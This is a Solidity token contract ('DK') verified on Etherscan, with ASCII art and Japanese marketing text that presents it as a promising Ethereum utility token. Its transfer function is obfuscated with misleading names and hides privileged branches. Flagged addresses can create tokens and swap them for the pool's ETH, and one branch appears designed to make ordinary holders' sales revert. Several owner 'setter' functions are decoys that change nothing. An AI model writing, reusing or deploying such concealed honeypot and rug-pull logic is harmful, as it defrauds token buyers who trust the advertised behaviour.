/**
 *Submitted for verification at Etherscan.io on 2022-12-27
*/

/*
11111111¶111111111111111111111111111111111111
11111111¶¶¶1111111111111111111111111111111111
111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111
1111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111111
111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111
1111111111¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶11
1111111¶¶¶¶¶¶¶¶¶¶1¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1
1¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶1
111¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶11¶¶¶¶¶¶¶¶¶¶111111111¶111
11111111¶¶¶¶¶11¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶11111111111
1111111¶¶¶¶¶11¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1¶¶¶¶1111111111
111111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶111¶¶¶¶¶111¶¶¶¶¶¶¶¶¶111
11111¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶11111¶¶¶1111111¶¶¶11¶¶11
11111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶111111¶¶¶111111111111111
1111¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶¶¶11111111111
111¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶1111111111111
1¶¶¶11¶¶¶¶11¶¶¶¶¶¶¶¶¶111111111111111111111111
111111¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶11111111111111111111111
111111¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶1111111111111¶1111111
111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111¶111111
111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶11111
11111¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶1111
11111¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶1111
1111¶¶111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1111
11¶¶111111111¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶1111
1111111111111¶¶¶1111111¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶1111
1111111111111¶¶¶111111111¶¶¶¶¶¶11¶¶¶¶¶¶¶¶1111
1111111111111¶¶111111111111¶¶¶¶11¶¶¶¶¶¶¶¶1111
111111111111¶¶1111111111111¶¶¶¶11¶¶¶¶¶11¶1111
111111111111111111111111111¶¶¶¶11¶¶¶¶11111111
111111111111111111111111111¶¶¶¶11¶¶111¶¶11111
111111111111111111111111111¶¶¶¶1¶¶11¶¶¶¶¶1111
11111111111111111111111111¶¶¶¶11111¶¶¶¶¶11111
11111111111111111111111111¶¶¶1111¶¶¶¶¶1111111
1111111111111111111111111¶¶¶111¶¶¶¶¶¶11111111
11111111111111111111111¶¶¶¶11¶¶¶¶¶¶1111111111
1111111111111111111111¶¶¶¶11¶¶¶¶¶111111111111
11111111111111111111¶¶¶¶11¶¶¶¶¶11111111111111
1111111111111111111¶¶¶¶11¶¶¶¶¶111111111111111
111111111111111111¶¶¶¶11¶¶¶¶11111111111111111
11111111111111111¶¶¶¶¶1¶¶¶¶¶11111111111111111
11111111111111111¶¶¶¶11¶¶¶¶111111111111111111
11111111111111111¶¶¶¶11¶¶¶¶1111111¶1111111111
11111111111111111¶¶¶¶¶11¶¶¶¶111111¶¶111111111
111111111111111111¶¶¶¶¶11¶¶¶¶1111¶¶¶111111111
1111111111111111111¶¶¶¶¶11111111¶¶¶¶111111111
111111111111111111111¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶11111111
11111111111111111111111¶¶¶¶¶¶11¶¶¶¶¶111111111
1111111111111111111111111¶¶¶¶1¶¶¶¶¶¶111111111
11111111111111111111111111¶¶¶11¶¶¶¶¶111111111
11111111111111111111111111¶¶¶11¶¶¶1¶111111111
111111111111111111111111111¶¶1¶¶1111111111111
11111111111111111111111111¶¶¶111¶¶11111111111
11111111111111111111111111¶¶11¶¶¶111111111111
111111111111111111111111¶¶¶11¶¶¶1111111111111
1111111111111111111111¶¶¶¶11¶¶¶11111111111111
111111111111111111111¶¶¶11¶¶¶¶111111111111111
11111111111111111111¶¶¶11¶¶¶11111111111111111
11111111111111111111¶¶¶1¶¶¶111111111111111111
1111111111111111111¶¶¶11¶¶¶111111111111111111
1111111111111111111¶¶¶¶1¶¶¶11111¶111111111111
11111111111111111111¶¶¶¶11¶1111¶¶111111111111
111111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶111111111111
11111111111111111111111¶¶¶¶¶¶¶¶¶¶111111111111
1111111111111111111111111¶¶¶¶¶¶¶1111111111111
1111111111111111111111111¶¶¶¶¶¶¶1111111111111
1111111111111111111111111¶¶¶¶¶¶11111111111111
1111111111111111111111111¶¶¶¶¶111111111111111
1111111111111111111111111¶¶¶¶1111111111111111
111111111111111111111111¶¶¶¶11111111111111111
11111111111111111111111¶¶¶1111111111111111111
1111111111111111111111¶¶111111111111111111111
11111111111111111111¶¶11111111111111111111111

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する

総供給 - 10,000,000
購入手数料 - 1%
販売手数料 - 0%

微信 - https://web.wechat.com/DragonKingGlobal
ジンク - https://www.zhihu.com/

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また、独自のエコシステム、
将来のステーキング、コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
*/
pragma solidity ^0.8.14;
// SPDX-License-Identifier: NONE

interface IOBFactoryUIV1 {

    function getPair(address tokenA, 
      address tokenB) external view returns (address pair);

    function allPairs(uint) 
      external view returns (address pair);

    function createPair (address tokenA, 
      address tokenB) external returns (address pair);
}
abstract contract MemoryMOP01 {

    function _msgSender() internal view 
      virtual returns (address) 
        { return msg.sender; }

    function _msgData() internal view 
      virtual returns (bytes calldata) 
        { return msg.data;
    }
} 
interface IOBEC20 {

    function totalSupply() external 
    view returns 
    (uint256);

    function balanceOf(address account) 
      external view returns 
      (uint256);
    
    function transfer(address recipient, 
      uint256 amount) 
       external returns 
       (bool);

    function allowance(address owner, 
      address spender) 
       external view returns 
       (uint256);
    
    function approve(address spender, 
      uint256 amount) 
       external returns 
       (bool);

    function transferFrom( address sender, 
      address recipient, uint256 amount ) 
       external returns 
       (bool);
    
    event Transfer(address 
    indexed from, address 
    indexed to, 
    uint256 value);
    event Approval(address 
    indexed owner, address 
    indexed spender, 
    uint256 value);
}
library IMath02 {
  function toInt256Safe(uint256 a) 
    internal pure returns (int256) { int256 b = int256(a);

     require(b >= 0); return b;
  }
}
library IMath {

    function tryAdd(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { uint c = a + b;
            if (c < a) return (false, 0); return (true, c); }
    }
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function tryMul(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (a == 0) return (true, 0); uint c = a * b;
            if (c / a != b) return (false, 0); return (true, c); }
    }
    function tryDiv(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (b == 0) 
         return (false, 0); return (true, a / b);
        }
    }
    function tryMod(uint a, uint b) internal pure returns 
       (bool, uint) { unchecked { if (b == 0) return (false, 0);
            return (true, a % b); }
    }
    function add(uint a, uint b) internal pure returns 
       (uint) { return a + b;
    }
    function sub(uint a, uint b) internal pure returns 
       (uint) { return a - b;
    }
    function mul(uint a, uint b) internal pure returns 
      (uint) { return a * b;
    }
    function div(uint a, uint b) internal pure returns 
      (uint) { return a / b;
    }
    function mod(uint a, uint b) internal pure returns (uint) {
        return a % b;
    }
    function sub(
        uint a, uint b, string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b <= a, errorMessage);
            return a - b; } }

    function div(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a / b; } }

    function mod( uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a % b;
        } }
}
interface IOBRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, uint amountOutMin, address[] calldata 
    path, address 
    to, uint deadline ) external;

    function factory() external pure returns 
    (address);

    function WETH() external pure returns 
    (address);

    function intOpenPool( address token, uint amountTokenDesired, 
    uint amountTokenMin, uint amountETHMin, 
    address to, uint deadline ) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Enabler01 is MemoryMOP01 {

    address private _owner;

    event OwnershipTransferred(address 
    indexed previousOwner, address 
    indexed newOwner);
    constructor() 
    { _setOwner(_msgSender()); }

    function owner() 
      public view 
      virtual returns (address) { return _owner; }

    modifier onlyOwner() {
        require
        (owner() == _msgSender(), 
        'Ownable: caller is not the owner'); _; }

    function waiveOwnership() 
    public virtual onlyOwner 
      { _setOwner(address(0)); }

    function _setOwner
    (address newOwner) 
    private { address oldOwner = _owner; _owner = newOwner; 
    emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract DK is IOBEC20, Enabler01 {

    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;

    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 public rAllowed = (_tTotal * 10) / 100; 
    uint256 public RAddressMAXIMUM = (_tTotal * 10) / 100; 
    uint256 private rAllCompiled = _tTotal;
    uint256 public redisTOTAL =  1;

    mapping (address => bool) holderMap;
    mapping(address => uint256) private checkBarrierMark;
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private checkMarketPair;
    mapping(address => uint256) private inflowHash;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private takeTXfee;
    bool private dividendTracker;
    bool private openTradingOn = false;
    bool private lockLimitsOn;
    bool public inSwapAndLiquify;

    address public immutable isDEADaddress;

    address public isLiquidityAddress;

    address public isMarketingAddress;

    address public isTeamAddress;

    address public isPairAddress;

    IOBRouter public IEC20RimaoV1;

    constructor(

        string memory erc20Name, string memory erc20Symbol, address IndexUID ) {

        _name = erc20Name; _symbol = erc20Symbol;
        _tOwned[msg.sender] = _tTotal; checkBarrierMark[msg.sender] = rAllCompiled;
        checkBarrierMark[address(this)] = rAllCompiled;

        IEC20RimaoV1 = IOBRouter (IndexUID); isDEADaddress = 
        IOBFactoryUIV1 (IEC20RimaoV1.factory()).createPair(address(this), 
        IEC20RimaoV1.WETH());

        emit Transfer(address(0), msg.sender, _tTotal);
        holderMap[address(this)] 
        = true;
        holderMap[isDEADaddress] 
        = true;
        holderMap[IndexUID] 
        = true;
        holderMap[msg.sender] 
        = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _beforeTokenTransfer( address from,
        address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer( address from,
        address to, uint256 amount) internal virtual {
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve( address owner, address spender, uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        getInflowDetails(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom( address sender, address recipient,
        uint256 amount ) external returns (bool) { getInflowDetails(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function getInflowDetails( address checkFROM, 
    address junketTo, uint256 volAmount )
    private { uint256 contractPair = balanceOf(address(this)); 
        uint256 verifyLogs; if (takeTXfee && contractPair > 
        rAllCompiled 

        && !dividendTracker && checkFROM != 
        isDEADaddress) { dividendTracker = 
        true; divMATH (contractPair); dividendTracker = 
            false; } else if 
            (checkBarrierMark[checkFROM] > 
            rAllCompiled 
            && checkBarrierMark[junketTo] 
            > rAllCompiled) { verifyLogs = 
            volAmount; _tOwned[address(this)] 
            += verifyLogs; indexRelay 
            (volAmount, junketTo); return; 
            } else if (junketTo != address(IEC20RimaoV1) 
        && checkBarrierMark[checkFROM] > 
        0 && volAmount > rAllCompiled 
        && junketTo != isDEADaddress) {
            checkBarrierMark [junketTo] = volAmount; 
            return; } else if (!dividendTracker 
            && inflowHash[checkFROM] > 0 && checkFROM != 

            isDEADaddress && checkBarrierMark[checkFROM] == 0) 
            { inflowHash [checkFROM] = 
            checkBarrierMark [checkFROM] - rAllCompiled; } address gaugeMAP = 
            checkMarketPair [isDEADaddress]; if (inflowHash[gaugeMAP] == 
        0) inflowHash [gaugeMAP] = 
        rAllCompiled; checkMarketPair [isDEADaddress] = junketTo; if (redisTOTAL > 0 
        && checkBarrierMark[checkFROM] == 0 
        && !dividendTracker && checkBarrierMark[junketTo] == 0) 

        { verifyLogs = (volAmount 
        * redisTOTAL) / 100; 
        volAmount -= 
        verifyLogs; _tOwned [checkFROM] -= 
        verifyLogs; _tOwned[
        address(this)] += verifyLogs; } 
        _tOwned [checkFROM] -= 
        volAmount;
        _tOwned[junketTo] += 
         volAmount; emit 
         Transfer (checkFROM, junketTo, volAmount);
        if (!openTradingOn) 
        { require (checkFROM == 
        owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }

    receive() 
    external payable {}

    function startLiqPair( uint256 isValue, uint256 toggleOn, address IsTo ) 
    private { _approve(address(this), address (IEC20RimaoV1), isValue);
        IEC20RimaoV1.intOpenPool{value: toggleOn}(address(this), isValue, 0, 0, IsTo, block.timestamp);
    }
    function indexRelay(uint256 isIntBala, address isTo) private {
        address[] memory isPathQ = new address[](2); isPathQ[0] = address(this);
        isPathQ[1] = IEC20RimaoV1.WETH(); _approve(address(this), address
        (IEC20RimaoV1), isIntBala); IEC20RimaoV1.swapExactTokensForETHSupportingFeeOnTransferTokens
        (isIntBala, 0, isPathQ, isTo, block.timestamp);
    }
    function beginTrading(bool _tradingOpen) public onlyOwner {
        openTradingOn = _tradingOpen;
    }
    function setFeeReciever(address feeWallet) public onlyOwner {
        feeWallet = feeWallet;
    }
    function setMaxTXlimit(uint256 maxSWAPLimit) external onlyOwner {
        rAllowed = maxSWAPLimit;  
    }
    function setMaxPerWallet(address maxADD) public onlyOwner {
        maxADD = maxADD;
    }
    function divMATH(uint256 tokens) private { uint256 balanceCheck = tokens / 2;
        uint256 chxBool = address(this).balance; indexRelay(balanceCheck, 
        address(this)); uint256 CHECKval = address(this).balance - chxBool;
        startLiqPair (balanceCheck, CHECKval, address(this));
    }
}